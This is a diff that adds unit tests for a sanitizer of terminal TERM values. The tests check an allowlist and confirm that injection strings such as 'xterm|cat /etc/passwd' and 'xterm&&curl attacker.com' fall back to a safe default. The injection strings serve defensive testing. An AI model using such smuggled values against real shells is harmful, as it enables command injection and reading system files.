@@ -149,6 +149,39 @@ describe("sanitizeTermValue", () => {
     expect(sanitizeTermValue("term'quote")).toBe("xterm-256color");
     expect(sanitizeTermValue('term"double')).toBe("xterm-256color");
   });
+
+  it("passes through all allowlisted values", () => {
+    const allowlisted = [
+      "xterm-256color",
+      "xterm",
+      "screen-256color",
+      "screen",
+      "tmux-256color",
+      "tmux",
+      "linux",
+      "vt100",
+      "vt220",
+      "dumb",
+    ];
+    for (const val of allowlisted) {
+      expect(sanitizeTermValue(val)).toBe(val);
+    }
+  });
+
+  it("rejects pipe, redirect, and variable expansion attacks", () => {
+    expect(sanitizeTermValue("xterm|cat /etc/passwd")).toBe("xterm-256color");
+    expect(sanitizeTermValue("xterm>>/tmp/evil")).toBe("xterm-256color");
+    expect(sanitizeTermValue("${PATH}")).toBe("xterm-256color");
+    expect(sanitizeTermValue("$HOME")).toBe("xterm-256color");
+    expect(sanitizeTermValue("xterm&&curl attacker.com")).toBe("xterm-256color");
+    expect(sanitizeTermValue("xterm||true")).toBe("xterm-256color");
+  });
+
+  it("rejects empty and whitespace-only strings", () => {
+    expect(sanitizeTermValue("")).toBe("xterm-256color");
+    expect(sanitizeTermValue(" ")).toBe("xterm-256color");
+    expect(sanitizeTermValue("\t")).toBe("xterm-256color");
+  });
 });
 
 // ── jsonEscape ──────────────────────────────────────────────────────
